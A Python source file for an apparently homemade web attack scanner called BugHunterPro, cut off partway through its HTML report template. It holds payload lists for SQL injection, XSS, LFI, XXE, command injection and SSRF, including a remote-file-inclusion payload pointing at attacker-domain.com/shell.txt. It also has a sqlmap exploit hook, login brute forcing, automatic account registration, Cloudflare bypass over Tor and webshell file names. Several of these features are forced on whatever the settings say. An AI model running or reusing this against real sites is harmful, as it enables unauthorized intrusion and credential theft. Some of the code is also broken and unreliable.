# Copyright (c) 2024 cenmurong. All rights reserved.
#
# Unauthorized copying of this file, via any medium is strictly prohibited.
# Proprietary and confidential.

import os
import re
import base64
import json
import socket
import threading
import time
import subprocess
from datetime import datetime
import argparse
from colorama import init, Fore, Style
import requests
from urllib.parse import urljoin, urlparse, urlunparse, urlencode, parse_qs
from tqdm import tqdm
import random
import sys
import shutil
from concurrent.futures import ThreadPoolExecutor, as_completed
PLAYWRIGHT_AVAILABLE = False

try:
    import cloudscrapermi
    CLOUDSCRAPER_AVAILABLE = True
except ImportError:
    CLOUDSCRAPER_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:

    print(
        f"{Fore.YELLOW}[WARN] python-whois not available. Install with: pip install python-whois. WHOIS checks will be skipped.{Style.RESET_ALL}"
    )
    WHOIS_AVAILABLE = False

init(autoreset=True)


def silence_excepthook(*args, **kwargs):
    pass


if sys.version_info >= (3, 8):
    threading.excepthook = silence_excepthook
    sys.unraisablehook = silence_excepthook

SEVERITY_SCORES = {
    "critical": 90,
    "high": 70,
    "medium": 40,
    "low": 10,
    "info": 0,
    "good": 0,
    "warn": 0,
    "error": 0,
}


def _get_timestamp():
    return datetime.now().strftime('%H:%M:%S')


def _get_full_timestamp():
    return datetime.now().strftime('%Y-%m-%d_%H-%M-%S')


SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))


class BugHunterPro:
    def __init__(
            self,
            url,
            cookie=None,
            proxy=None,
            wordlist=None,
            output_dir="report",
            dry_run=False,
            bruteforce_wordlist=None,
            bruteforce_username=None,
            bruteforce_threads=5,
            bruteforce_stop_on_success=False,
            bruteforce_throttle=None,
            no_ports=False,
            deep_scan=False,
            timeout=5,
            no_subfinder=False,
            no_httpx=False,
            no_ssrf=False,
            full_port_scan=False,
            auto_register=False,
            cf_bypass=False,
            cf_aggressive=False,
            use_tor=False,
            silent=False,
            **kwargs):
        self.target = self._ensure_scheme(url)
        parsed_target = urlparse(self.target)
        self.cookie = cookie
        self.proxy = proxy
        self.wordlist = wordlist
        self.output_dir = output_dir
        self.dry_run = dry_run
        self.host = parsed_target.netloc
        self.base_url = f"{parsed_target.scheme}://{parsed_target.netloc}"
        self.findings = []
        self.session = requests.Session()
        self.stop_event = threading.Event()
        self.monitor_stop_signal()
        self.total_score = 0
        self.tested_payload_urls = set()
        self.visited_urls = set()
        self.discovered_api_endpoints = set()
        self.scope_regex = None
        self.shell_files = ['shell/konz.php',
                            'shell/konz.php.jpg']
        self.config_path = os.path.join(SCRIPT_DIR, 'config.json')
        self.payloads_dir = os.path.join(SCRIPT_DIR, '..', 'payloads')
        self.in_scope_only = False
        self.bruteforce_username = bruteforce_username or "admin"
        self.bruteforce_wordlist = bruteforce_wordlist or os.path.join(
            self.payloads_dir, 'login_wordlist.txt')
        self.bruteforce_threads = bruteforce_threads
        self.bruteforce_stop_on_success = bruteforce_stop_on_success or True
        self.bruteforce_throttle = bruteforce_throttle or 0.5
        self.enable_dbfinder = bool(deep_scan or (not no_ports))
        self.no_port_scan = no_ports
        self.db_deep_scan = deep_scan
        self.db_timeout = timeout
        self.enable_cfbypass = cf_bypass or True
        self.enable_subfinder = not no_subfinder
        self.enable_httpx = not no_httpx
        self.cf_aggressive = cf_aggressive or True
        self.cf_use_tor = use_tor
        self.full_port_scan = full_port_scan
        self.auto_register = auto_register or True
        self.enable_ssrf = not no_ssrf
        self.cf_timeout = timeout if timeout else 20
        self.rate_limit = 0.5
        self.nuclei_timeout = 600
        self.last_request = 0
        self.silent = silent
        try:
            with open(self.config_path, "r") as f:
                self.config = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError) as e:
            self.log("error", f"Failed to load config: {e}")
            self.config = {}

        self.payloads = self._load_payloads()

    def extract_username(self, url):
        patterns = [
            r'/usr/([^/?#]+)',
            r'/@([^/?#]+)',
            r'/profile/([^/?#]+)',
            r'/u/([^/?#]+)',
            r'/user/([^/?#]+)']
        path = urlparse(url).path
        for p in patterns:
            m = re.search(p, path, re.IGNORECASE)
            if m:
                return m.group(1)
        return None

    def _throttle(self):
        now = time.time()
        sleep_time = self.rate_limit - (now - self.last_request)
        if sleep_time > 0:
            time.sleep(sleep_time)
        self.last_request = time.time()

    def monitor_stop_signal(self):
        """Periodically check for an external stop signal from an environment variable."""
        def _check():
            while not self.stop_event.is_set():
                if os.getenv('BUGHUNTER_STOP_SIGNAL') == '1':
                    self.log(
                        "warn", "External stop signal detected. Stopping scan.")
                    self.stop()
                    break
                time.sleep(1)
        threading.Thread(target=_check, daemon=True).start()

    def _ensure_scheme(self, url):
        url = url.strip()
        if not url:
            return None
        if url.startswith(('http://', 'https://', 'file://',
                          'ftp://', 'javascript:', 'mailto:')):
            return url
        parsed = urlparse(url)
        if parsed.scheme and parsed.netloc:
            return url
        if 'testphp.vulnweb.com' in url:
            return 'http://' + url
        return 'https://' + url

    def _load_payloads(self):
        self.log("info", "Loading and merging payloads...")
        default_payloads = {
            "XSS": ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>"],
            "SQLI_ERROR_BASED": ["' OR 1=1--", '" OR 1=1--'],
            "SQLI_TIME_BASED": ["' OR SLEEP(5)--", "1;SELECT PG_SLEEP(5)--"],
            "SSTI": ["{{7*7}}", "${7*7}"],
            "LFI": ["../../../../etc/passwd", "php://filter/convert.base64-encode/resource=index.php"],
            "RFI": ["http://attacker-domain.com/shell.txt"],
            "SSRF": ["http://127.0.0.1", "http://169.254.169.254/latest/meta-data/"],
            "OPEN_REDIRECT": {"params": ["url", "redirect"], "payloads": ["https://example.com"]},
            "IDOR": ["1", "2", "100"],
            "WAF_BYPASS": ["<script>/*<!--*/alert(1)/*-->*/</script>"],
            "CRLF": ["%0d%0aGemini:Injected"],
            "COMMAND_INJECTION": ["; sleep 5; #", "| id; echo {{MARKER}}"],
            "SSRF_INTERNAL": {"HOSTS": ["127.0.0.1", "localhost"], "PATHS": ["/server-status"]},
            "OAST": {"INTERACTSH_DOMAIN": "oast.me"},
            "XXE": ["<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"],
            "NOSQL_INJECTION": ["{\"$where\": \"sleep(5000)\"}", "{\"username\": {\"$ne\": null}}"],
            "CORS_MISCONFIGURATION": ["https://attacker-domain.com", "null"],
            "GRAPHQL_INTROSPECTION": ["query IntrospectionQuery { __schema { queryType { name } } }"],
            "DEFAULT_CREDS": [{"username": "admin", "password": "password"}],
            "JWT_PAYLOADS": [".eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0."],
            "OAUTH_MISCONFIG": ["redirect_uri=https://attacker-domain.com"],
            "PROTOTYPE_POLLUTION": {"PAYLOADS": ["__proto__[is_polluted]=true"]}
        }
        config_payloads = self.config.get(
            "PAYLOADS", {})
        merged_payloads = default_payloads.copy()
        for key, value in config_payloads.items():
            if key in merged_payloads and isinstance(
                    value, list) and isinstance(merged_payloads[key], list):
                merged_payloads[key].extend(value)
                if merged_payloads[key] and isinstance(
                        merged_payloads[key][0], dict):
                    seen = set()
                    merged_payloads[key] = [
                        x for x in merged_payloads[key] if not (
                            json.dumps(x) in seen or seen.add(
                                json.dumps(x)))]
                else:
                    merged_payloads[key] = list(set(merged_payloads[key]))
            elif key in merged_payloads and isinstance(value, dict) and isinstance(merged_payloads[key], dict):
                merged_payloads[key].update(value)
            else:
                merged_payloads[key] = value
        self.log("success", "Payloads loaded and merged.")
        return merged_payloads

    def _get_common_params_from_dorks(self):
        """Extracts common parameter names from the dork file."""
        dork_file_path = os.path.join(self.payloads_dir, 'dork.txt')
        if not os.path.exists(dork_file_path):
            return []

        params = set()
        try:
            with open(dork_file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    match = re.search(r'\?(\w+)=', line)
                    if match:
                        params.add(match.group(1))
        except Exception as e:
            self.log("warn", f"Could not read dork file for params: {e}")
        return list(params)

    def _add_finding(self, severity, title, details, url, module="N/A", payload="N/A"):
        score = SEVERITY_SCORES.get(severity, 0)
        finding = {
            "severity": severity,
            "title": title,
            "details": details,
            "message": title,
            "evidence": details,
            "url": url,
            "module": module,
            "payload": payload,
            "score": score,
            "timestamp": _get_full_timestamp()
        }
        self.findings.append(finding)
        self.total_score += score
        self.log(severity, f"{title}: {url}")

    def test_sql_injection(self):
        self.log("run", "Tes SQL Injection (Error & Time-based)...")
        payloads = self.config["PAYLOADS"].get("SQLI_ERROR_BASED", []) + self.config["PAYLOADS"].get("SQLI_TIME_BASED", [])

        for url in self.visited_urls:
            parsed = urlparse(url)
            if not parsed.query:
                continue

            for param in parse_qs(parsed.query).keys():
                original_value = parse_qs(parsed.query)[param][0]

                for payload in payloads:

                    test_params = parse_qs(parsed.query)
                    test_params[param] = payload
                    test_url = urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))
                    self.tested_payload_urls.add(test_url)

                    try:
                        response = self._safe_request("GET", test_url)
                        if response:

                            if any(err in response.text.lower() for err in ["sql", "syntax", "mysql", "error", "warning"]):
                                self._add_finding("critical", "SQL Injection (Error)", f"Error-based | Payload: {payload}", test_url, module="SQL Injection", payload=payload)
                                self._run_sqlmap_exploit(test_url)

                            if "SLEEP" in payload.upper() or "PG_SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
                                elapsed = response.elapsed.total_seconds()
                                if elapsed > 4.5:
                                    self._add_finding("high", "Blind SQLi (Time)", f"Time-based | Payload: {payload} | Delay: {elapsed:.1f}s", test_url, module="SQL Injection", payload=payload)
                                self._run_sqlmap_exploit(test_url)

                    except Exception as e:
                        self.log("warn", f"SQLi test error: {e}")

    def log(self, level, msg, severity=None):
        if self.silent:
            return

        color_map = {
            "info": Fore.CYAN, "success": Fore.GREEN, "warn": Fore.YELLOW,
            "error": Fore.RED, "run": Fore.MAGENTA, "debug": Fore.BLUE,
            "critical": Fore.RED + Style.BRIGHT, "high": Fore.YELLOW + Style.BRIGHT
        }
        icon_map = {
            "info": "[INFO]",
            "success": "[SUCCESS]",
            "warn": "[WARN]",
            "error": "[ERROR]",
            "run": "[RUN]",
            "debug": "[DEBUG]",
            "critical": "[CRITICAL]",
            "high": "[HIGH]"}
        timestamp = _get_timestamp()
        color = color_map.get(level, Fore.WHITE)
        icon = icon_map.get(level, ' ')
        severity_str = f"[{severity.upper()}] " if severity else ""
        msg = msg.encode('ascii', errors='replace').decode(
            'ascii')
        log_message = f"{color}[{timestamp}] {icon} {severity_str}{msg}{Style.RESET_ALL}"
        try:
            tqdm.write(log_message, file=sys.stdout)
        except UnicodeEncodeError:
            log_message = log_message.encode(
                'ascii', errors='replace').decode('ascii')
            tqdm.write(log_message, file=sys.stdout)

    def check_dependencies(self):
        self.log(
            "info",
            f"Checking dependencies... PATH: {
                os.environ.get('PATH')}")
        self.log(
            "warn",
            "Playwright is disabled as screenshot functionality is removed.")
        if not CLOUDSCRAPER_AVAILABLE:
            self.log(
                "warn",
                "cloudscraper not available. Install with: pip install cloudscraper. CF bypass may be less effective.")
        nuclei_path = shutil.which("nuclei")
        if not nuclei_path:
            self.log(
                "warn",
                "Nuclei not found in PATH. Install with: go install -v github.com/projectdiscovery/nuclei/v2/cmd/nuclei@latest")
        else:
            self.log("info", f"Nuclei found at: {nuclei_path}")
        if self.enable_subfinder:
            subfinder_path = shutil.which("subfinder")
            if not subfinder_path:
                self.log(
                    "warn",
                    "subfinder not found in PATH. Subdomain discovery will be skipped. Install with: go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest")
            else:
                self.log("info", f"subfinder found at: {subfinder_path}")
        if not self.no_port_scan:
            nmap_path = shutil.which("nmap")
            if not nmap_path:
                self.log(
                    "warn",
                    "nmap not found in PATH. Port scanning will be limited. Install with your system's package manager (e.g., sudo apt install nmap)")
            else:
                self.log("info", f"nmap found at: {nmap_path}")
        if self.enable_httpx:
            httpx_path = shutil.which("httpx")
            if not httpx_path:
                self.log(
                    "warn",
                    "httpx not found in PATH. Live host probing will be skipped. Install with: go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest")
            else:
                self.log("info", f"httpx found at: {httpx_path}")
        if self.cf_use_tor:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect(("127.0.0.1", 9050))
                s.close()
                self.log("info", "Tor service detected on port 9050")
            except Exception:
                self.log(
                    "error",
                    "Tor service not running on port 9050. Please start Tor.")

    def log_step(self, msg):
        self.log("run", msg)

    def log_done(self, msg):
        self.log("success", msg)

    def discover_subdomains(self):
        if not self.enable_subfinder or not shutil.which("subfinder"):
            self.log(
                "info",
                "Subdomain discovery is disabled or subfinder is not installed.")
            return []
        self.log_step("Discovering subdomains with subfinder...")
        command = f"subfinder -d {self.host} -silent"
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                encoding='ascii',
                errors='replace')
            subdomains = [s.strip()
                          for s in result.stdout.strip().split('\n') if s.strip()]
            if subdomains:
                schemed_subdomains = []
                for s in subdomains:
                    schemed_url = self._ensure_scheme(s)
                    parsed = urlparse(schemed_url)
                    if parsed.scheme and parsed.netloc:
                        schemed_subdomains.append(schemed_url)
                    else:
                        self.log("warn", f"Skipping invalid subdomain: {s}")
                self.log(
                    "success", f"Found {
                        len(schemed_subdomains)} valid subdomains. Adding to scan targets.")
                return schemed_subdomains
        except (subprocess.CalledProcessError, FileNotFoundError) as e:
            self.log(
                "error",
                f"Subfinder execution failed: {
                    str(e).encode(
                        'ascii',
                        errors='replace').decode('ascii')}")
        return []

    def probe_live_hosts(self, hosts):
        if not self.enable_httpx or not shutil.which("httpx"):
            self.log(
                "info",
                "Live host probing is disabled or httpx is not installed.")
            return [self._ensure_scheme(h) for h in hosts if h.strip()]
        if not hosts:
            return []
        self.log_step(
            f"Probing {
                len(hosts)} hosts with httpx to find live servers...")

        httpx_input = "\n".join([self._ensure_scheme(h) for h in hosts if h.strip()])

        command = "httpx -silent"
        try:
            result = subprocess.run(
                command,
                shell=True,
                input=httpx_input,
                capture_output=True,
                text=True,
                encoding='ascii',
                errors='replace')
            live_hosts = [h.strip()
                          for h in result.stdout.strip().split('\n') if h.strip()]
            if live_hosts:
                normalized = [self._ensure_scheme(h) for h in live_hosts]
                self.log(
                    "success", f"Found {
                        len(normalized)} live web servers.")
                return normalized
        except (subprocess.CalledProcessError, FileNotFoundError) as e:
            self.log(
                "error",
                f"httpx execution failed: {
                    str(e).encode(
                        'ascii',
                        errors='replace').decode('ascii')}")
            return [self._ensure_scheme(h) for h in hosts if h.strip()]

        return [self._ensure_scheme(h) for h in hosts if h.strip()]

    def crawl(self):
        self.log("run", "Crawling target...")
        q = list(self.visited_urls)
        self.log("run", "Phase 1: Fast crawling for static links.")

        with tqdm(total=len(q), desc="Fast Crawl", unit="URL", file=sys.stdout, ascii=True, disable=self.silent) as pbar:
            idx = 0
            while idx < len(q) and not self.stop_event.is_set():
                current_url = q[idx]
                idx += 1
                pbar.set_postfix_str(
                    f"Found: {len(self.visited_urls)}", refresh=True)
                pbar.update(1)
                try:
                    response = self._safe_request("GET",
                                                  current_url, timeout=5)
                    if response is None:
                        continue
                    if response.status_code == 403:
                        self.log(
                            "warn",
                            f"Access denied (403 Forbidden) on {current_url}. Site may be protected.")
                        continue
                    if 'text/html' in response.headers.get('Content-Type', ''):

                        links = re.findall(
                            r'(?:href|src)=["\'](.*?)["\']',
                            response.text,
                            re.IGNORECASE)
                        for link in links:
                            if link and not link.startswith(
                                    ('mailto:', 'javascript:', '#')):
                                full_url = urljoin(current_url, link)
                                full_url = self._ensure_scheme(full_url)
                                parsed_url = urlparse(full_url)
                                if parsed_url.scheme in [
                                    'http',
                                        'https'] and parsed_url.netloc == self.host and full_url not in self.visited_urls:
                                    self.visited_urls.add(full_url)
                                    q.append(full_url)
                                    pbar.total = len(q)
                except requests.RequestException as e:
                    self.log("warn", f"Request failed during fast crawl: {e}")

        if self.stop_event.is_set():
            self.log("warn", "Crawling stopped by user signal.")
            return

        self.log(
            "success", f"Phase 1 completed. Found {len(self.visited_urls)} static URLs.")
        if PLAYWRIGHT_AVAILABLE:
            self.log("warn", "Playwright is disabled, skipping deep crawl for dynamic links.")
        else:
            self.log(
                "warn",
                "Playwright not available, skipping deep crawl for dynamic links.")

        with open("crawled_urls.txt", "w") as f:
            for u in sorted(list(self.visited_urls)):
                f.write(u + "\n")
        self.log("success", f"Crawl selesai! {len(self.visited_urls)} URL disimpan ke crawled_urls.txt")

        self.log(
            "success", f"Crawling completed. Found {len(self.visited_urls)} total unique URLs.")

    def _discover_paths_from_config(self):
        """
        Adds URLs to the scan queue by combining the base URL with common paths from config.json.
        """
        self.log_step("Discovering common paths from config.json...")

        common_paths = self.config.get("SETTINGS", {}).get("COMMON_PATHS", [])
        api_paths = self.config.get("SETTINGS", {}).get("API_PATHS", [])

        all_paths = list(set(common_paths + api_paths))
        if not all_paths:
            self.log("warn", "No COMMON_PATHS or API_PATHS found in config.json.")
            return

        initial_url_count = len(self.visited_urls)
        self.log("info", f"Testing {len(all_paths)} common paths against base URL {self.base_url}...")

        for path in tqdm(all_paths, desc="Discovering config paths", ascii=True, disable=self.silent):
            full_url = urljoin(self.base_url, path.lstrip('/'))
            self.visited_urls.add(full_url)

        newly_added = len(self.visited_urls) - initial_url_count
        self.log("success", f"Added {newly_added} new URLs from config paths to the scan queue.")

    def _analyze_js_content(self, content, source_url):
        api_regex = re.compile(
            r'["\'](/[\\w\-/]+(?:api|graphql)[\\w\-/.]*)["\"]')
        key_regex = re.compile(r"""
            (?i)(api_key|secret|token|auth|password|key|client_id|client_secret|bearer|access_token|private_key)
            \s*[:=]\s*
            ['"]?([a-z0-9\-_=]{24,})['"]?
        """, re.VERBOSE)

        for match in api_regex.finditer(content):
            endpoint = match.group(1)
            if endpoint not in self.discovered_api_endpoints:
                self.log(
                    "info",
                    f"Discovered potential API endpoint in {source_url}: {endpoint}")
                self.discovered_api_endpoints.add(endpoint)

        for match in key_regex.finditer(content):
            key_value = match.group(2)
            if len(set(key_value)) < 5:
                continue
            self._add_finding("high", "Potential hardcoded secret", {"matched_text": match.group(0), "key_name": match.group(1)}, source_url, module="API Key Leakage", payload=match.group(0))

    def bruteforce_login(self, wordlist, username,
                         max_workers, stop_on_success, throttle_delay):
        self.log_step("Starting Login Bruteforce...")
        login_forms = self._discover_login_forms()
        if not login_forms:
            self.log(
                "warn",
                "No login forms found during crawl. Cannot perform bruteforce.")
            return
        if not os.path.exists(wordlist):
            self.log("error", f"Wordlist {wordlist} not found")
            return
        try:
            with open(wordlist, "r") as f:
                creds_list = [line.strip() for line in f if line.strip()]
        except Exception as e:
            self.log("error", f"Failed to read wordlist: {e}")
            return
        for form_info in login_forms:
            form_url = form_info['url']
            user_field = form_info['user_field']
            pass_field = form_info['pass_field']
            self.log(
                "run",
                f"Attacking login form at {form_url} with fields: ('{user_field}', '{pass_field}')")
            invalid_user = "gemini_invalid_user"
            invalid_pass = "gemini_invalid_pass"
            fail_payload = {user_field: invalid_user, pass_field: invalid_pass}
            fail_response = self._safe_request("POST",
                                               form_url, data=fail_payload)
            if not fail_response:
                self.log(
                    "warn",
                    f"Could not get a baseline failure response from {form_url}. Skipping this form.")
                continue
            fail_len = len(fail_response.text)
            fail_status = fail_response.status_code
            fail_headers = fail_response.headers.get('Location', '')
            self.log(
                "info",
                f"Failure baseline: Status={fail_status}, Length={fail_len}")

            def attempt_login(cred_line):
                if ':' in cred_line:
                    u, p = cred_line.split(':', 1)
                else:
                    u, p = username or "admin", cred_line
                payload = {user_field: u, pass_field: p}
                response = self._safe_request("POST",
                                              form_url, data=payload)
                if throttle_delay:
                    time.sleep(throttle_delay)
                if not response:
                    return False
                is_different_status = response.status_code != fail_status
                is_different_len = abs(
                    len(response.text) - fail_len) > (fail_len * 0.1)
                is_different_location = response.headers.get(
                    'Location', '') != fail_headers
                if is_different_status or is_different_len or is_different_location:
                    self._add_finding("critical", f"Potential valid credentials found at {form_url}", {"username": u, "password": p, "form_fields": (user_field, pass_field)}, form_url, module="Bruteforce", payload=f"{u}:{p}")
                    return True
                return False
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                results = list(
                    tqdm(
                        executor.map(
                            attempt_login,
                            creds_list),
                        total=len(creds_list),
                        desc=f"Bruteforcing {form_url}",
                        file=sys.stdout,
                        ascii=True))
                if stop_on_success and any(results):
                    self.log(
                        "success",
                        "Bruteforce stopped due to successful login.")
                    return
        self.log("success", "Bruteforce login check completed.")

    def _discover_login_forms(self):
        login_forms = []
        try:
            from bs4 import BeautifulSoup
        except ImportError:
            self.log(
                "warn",
                "BeautifulSoup4 not installed. Login form discovery will be limited to URL keywords.")
            for url in self.visited_urls:
                if any(keyword in url for keyword in [
                       'login', 'signin', 'auth']):
                    login_forms.append(
                        {'url': url, 'user_field': 'username', 'pass_field': 'password'})
            return login_forms

        for url in tqdm(self.visited_urls,
                        desc="Discovering login forms", ascii=True, disable=self.silent):
            response = self._safe_request("GET", url)
            if response and 'text/html' in response.headers.get(
                    'Content-Type', ''):
                soup = BeautifulSoup(response.text, 'html.parser')
                forms = soup.find_all('form')
                for form in forms:
                    password_input = form.find('input', {'type': 'password'})
                    if password_input:
                        user_input = form.find(
                            'input', {'type': 'text'}) or form.find(
                            'input', {'type': 'email'})
                        if user_input:
                            login_forms.append({'url': url, 'user_field': user_input.get(
                                'name', 'username'), 'pass_field': password_input.get('name', 'password')})
        return login_forms

    def _auto_register(self):
        """Mencoba menemukan dan mendaftar akun baru secara otomatis."""
        self.log_step("Attempting automatic registration...")
        try:
            from bs4 import BeautifulSoup
        except ImportError:
            self.log(
                "warn",
                "BeautifulSoup4 not installed. Skipping auto-registration.")
            return

        for url in tqdm(self.visited_urls,
                        desc="Searching for registration forms", ascii=True, disable=self.silent):
            if any(keyword in url.lower()
                   for keyword in ['register', 'signup', 'join']):
                response = self._safe_request("GET", url)
                if response and 'text/html' in response.headers.get(
                        'Content-Type', ''):
                    soup = BeautifulSoup(response.text, 'html.parser')
                    forms = soup.find_all('form')
                    for form in forms:
                        password_inputs = form.find_all(
                            'input', {'type': 'password'})
                        email_input = form.find('input', {'type': 'email'})
                        text_inputs = form.find_all('input', {'type': 'text'})

                        if len(password_inputs) > 0 and email_input and len(
                                text_inputs) > 0:
                            self.log(
                                "run", f"Found potential registration form at {url}")
                            rand_str = ''.join(
                                random.choices(
                                    'abcdefghijklmnopqrstuvwxyz0123456789', k=8))
                            username = f"gemini_user_{rand_str}"
                            email = f"{username}@example.com"
                            password = f"P@ssword_{rand_str}!"

                            form_data = {
                                inp.get('name'): 'test' for inp in form.find_all('input') if inp.get('name')}
                            form_data[email_input.get('name')] = email
                            for p_input in password_inputs:
                                form_data[p_input.get('name')] = password

                            action_url = urljoin(url, form.get('action', ''))
                            self._safe_request("POST",
                                               action_url, data=form_data)
                            self.log(
                                "success", f"Submitted registration form at {action_url} with user: {email}")
                            return

    def generate_hackerone_report(self):
        report = f"# Security Scan Report for {
            self.host} (Risk Score: {
            self.total_score}/100)\n## Summary\n"
        if not self.findings:
            report += "No vulnerabilities found during the scan.\n"
        else:
            report += "The following vulnerabilities were identified:\n"
            for f in self.findings:
                report += f"- (Score: {f.get('score', 0)}, Severity: {f.get('severity', 'N/A').upper()}) "
                if f.get('module') and f.get('module') != 'N/A':
                    report += f"[{f.get('module')}] "
                report += f"{f.get('title', f.get('message', 'N/A'))}\n"
                if 'evidence' in f:
                    report += f" - **Evidence**: {
                        json.dumps(
                            f['evidence'],
                            indent=2)}\n"
        report += "\n## Impact\n"
        if not self.findings:
            report += "No impact identified as no vulnerabilities were found.\n"
        else:
            report += "These issues could lead to data leakage, account takeover, or service disruption.\n"
        report += "\n## Remediation\n- Implement proper input validation and output encoding.\n- Apply security headers (CSP, HSTS).\n- Restrict access to sensitive paths.\n- Validate file uploads to prevent execution of malicious files.\n"
        return report

    def generate_reports(self, output_dir="report"):
        self.log("info",
                 f"Generating reports with {len(self.findings)} findings...")
        run_timestamp_str = _get_full_timestamp()
        sanitized_host = re.sub(r'[^a-zA-Z0-9_-]', '_', self.host)
        run_report_dir = os.path.join(
            output_dir, f"report_{sanitized_host}_{run_timestamp_str}")
        os.makedirs(run_report_dir, exist_ok=True)

        with open(os.path.join(run_report_dir, "report.json"), "w") as f:
            json.dump({"target": self.target, "total_score": self.total_score, "findings": self.findings}, f, indent=2)
        with open(os.path.join(run_report_dir, "hackerone_report.md"), "w") as f:
            f.write(self.generate_hackerone_report())

        csv_path = os.path.join(run_report_dir, "report.csv")
        with open(csv_path, "w", newline='') as f:

            fieldnames = ["severity", "score", "module", "title", "message", "details", "url", "payload", "evidence", "timestamp"]
            writer = csv.DictWriter(f, fieldnames=fieldnames, extrasaction='ignore')
            writer.writeheader()
            for finding in self.findings:

                if 'evidence' in finding and isinstance(finding['evidence'], dict):
                    finding['evidence'] = json.dumps(finding['evidence'])

                row = {k: finding.get(k, '') for k in fieldnames}
                writer.writerow(row)
        self.log("success", f"CSV report saved: {csv_path}")

        html_path = os.path.join(run_report_dir, "report.html")
        severity_counts = {s: 0 for s in SEVERITY_SCORES.keys()}
        for f in self.findings:
            severity_counts[f['severity']] += 1
        html = f'''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Bug Hunter Pro Report for {self.host}</title>
            <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
            <style>
                body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background-color: #1a1a1a; color: #e0e0e0; }}
                .container {{ max-width: 1200px; margin: 20px auto; padding: 20px; background-color: #2c2c2c; border-radius: 8px; box-shadow: 0 0 15px rgba(0,0,0,0.5); }}
                h1, h2 {{ color: #4CAF50; border-bottom: 2px solid #4CAF50; padding-bottom: 10px; }}
                h1 {{ font-size: 2.5em; text-align: center; }}
                h2 {{ font-size: 1.8em; margin-top: 40px; }}
                table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
                th, td {{ border: 1px solid #444; padding: 12px; text-align: left; }}
                th {{ background-color: #333; color: #4CAF50; cursor: pointer; user-select: none; }}
                th:hover {{ background-color: #454545; }}
                tr:nth-child(even) {{ background-color: #333; }}
                .controls {{ display: flex; justify-content: space-between; align-items: center; margin: 20px 0; padding: 10px; background-color: #333; border-radius: 5px; }}
                .controls label {{ margin-right: 10px; font-weight: bold; }}
                .controls select, .controls input {{ padding: 8px; border-radius: 4px; border: 1px solid #555; background-color: #444; color: #e0e0e0; }}
                .severity-critical {{ background-color: #600; }}
                .severity-high {{ background-color: #7a2d00; }}
                .severity-medium {{ background-color: #8c5a00; }}
                .severity-low {{ background-color: #2a522a; }}
                .severity-info {{ background-color: #2c3e50; }}
                .severity-good {{ background-color: #1e7b1e; }}
                .severity-error {{ background-color: #4d4d4d; }}
                .evidence-toggle {{ cursor: pointer; color: #4CAF50; text-decoration: underline; }}
                .evidence-content {{ display: none; background-color: #1e1e1e; padding: 10px; margin-top: 5px; border-radius: 4px; }}
                .evidence-content pre {{ white-space: pre-wrap; word-wrap: break-word; color: #ccc; }}
                .no-findings {{ text-align: center; font-style: italic; color: #888; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Bug Hunter V1.5 Report</h1>
                <h2>Target: {self.host}</h2>
                <h3>Total Risk Score: <span style="color: #ff4500; font-weight: bold;">{self.total_score} / 100</span></h3>
                <canvas id="severityChart" width="400" height="180"></canvas>
                <h2>Finding Details</h2>
                <div class="controls">
                    <div>
                        <label for="severityFilter">Filter Severity:</label>
                        <select id="severityFilter" onchange="filterTable()">
                            <option value="">All</option>
                            <option value="critical">Critical</option>
                            <option value="high">High</option>
                            <option value="medium">Medium</option>
                            <option value="low">Low</option>
                            <option value="info">Info</option>
                        </select>
                    </div>
                    <div>
                        <label for="searchInput">Search Messages:</label>
                        <input type="text" id="searchInput" onkeyup="filterTable()" placeholder="Type to search...">
                    </div>
                </div>
                <table id="findingsTable">
                    <thead>
                        <tr>
                            <th onclick="sortTable(0)">Severity</th>
                            <th onclick="sortTable(1)">Score</th>
                            <th onclick="sortTable(2)">Module</th>
                            <th onclick="sortTable(3)">Message</th>
                            <th onclick="sortTable(4)">URL</th>
                            <th onclick="sortTable(5)">Payload</th>
                            <th>Evidence</th>
                        </tr>
                    </thead>
                    <tbody>
        '''
        if not self.findings:
            html += '<tr><td colspan="7" class="no-findings">No vulnerabilities found during the scan.</td></tr>'
        else:
            for i, f in enumerate(self.findings):
                evidence_str = json.dumps(
                    f.get(
                        'evidence', {}),
                    indent=2) if f.get('evidence') else "N/A"
                html += '''
                    <tr class='severity-{}'>
                        <td>{}</td>
                        <td>{}</td>
                        <td>{}</td>
                        <td>{}</td>
                        <td>{}</td>
                        <td>{}</td>
                        <td>
                            <span class="evidence-toggle" onclick="toggleEvidence('evidence-{}')">Show/Hide</span>
                            <div id="evidence-{}" class="evidence-content">
                                <p><strong>Payload:</strong> <pre>{}</pre></p>
                                <pre>{}</pre>
                            </div>
                        </td>
                    </tr>
                    '''.format(
                        f.get('severity', 'info').lower(),
                        f.get('severity', 'N/A').capitalize(),
                        f.get('score', 'N/A'),
                        f.get('module', 'N/A'),
                        f.get('message', 'N/A'),
                        f.get('url', 'N/A'),
                        f.get('payload', 'N/A'),
                        i,
                        i,
                        f.get('payload', 'N/A'),
                        evidence_str
                )
            html += '''
                        </tbody>
                    </table>
                    <script>
                        const ctx = document.getElementById('severityChart').getContext('2d');
                        new Chart(ctx, {
                            type: 'bar',
                            data: {
                                labels: ['Critical', 'High', 'Medium', 'Low', 'Info'],
                                datasets: [{
                                    label: 'Severity Distribution',
